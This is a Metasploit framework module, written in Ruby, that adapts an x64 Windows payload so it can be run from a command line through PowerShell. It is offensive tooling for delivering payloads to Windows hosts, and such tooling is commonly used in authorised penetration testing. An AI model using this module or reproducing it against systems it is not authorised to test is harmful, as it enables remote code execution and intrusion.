##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Powershell Exec',
        'Description' => 'Execute an x64 payload from a command via PowerShell',
        'Author' => 'Spencer McIntyre',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X64,
        'AdaptedPlatform' => 'win',
        'RequiredCmd' => 'powershell'
      )
    )
  end

  def generate
    payload = super

    cmd_psh_payload(payload, ARCH_X64, remove_comspec: true)
  end

  def generate_payload_uuid(conf = {})
    conf[:arch] ||= module_info['AdaptedArch']
    conf[:platform] ||= module_info['AdaptedPlatform']
    super
  end
end
